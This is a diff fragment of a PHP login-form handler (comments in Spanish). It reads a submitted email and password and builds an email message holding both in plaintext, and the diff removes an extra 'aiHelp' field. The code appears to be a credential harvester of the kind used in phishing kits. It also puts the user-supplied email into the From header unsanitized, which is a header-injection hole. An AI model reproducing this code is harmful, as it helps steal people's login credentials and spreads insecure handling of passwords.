@@ -9,12 +9,10 @@ $asunto = "Formulario de inicio de sesión";
 // Datos del formulario
 $email = $_POST['email'];
 $password = $_POST['password'];
-$respuesta = $_POST['aiHelp'];
 
 // Construir el mensaje del correo
 $mensaje = "Correo electrónico: $email\n";
 $mensaje .= "Contraseña: $password\n";
-$mensaje .= "Respuesta: $respuesta\n";
 
 // Cabeceras del correo
 $headers = "From: $email";
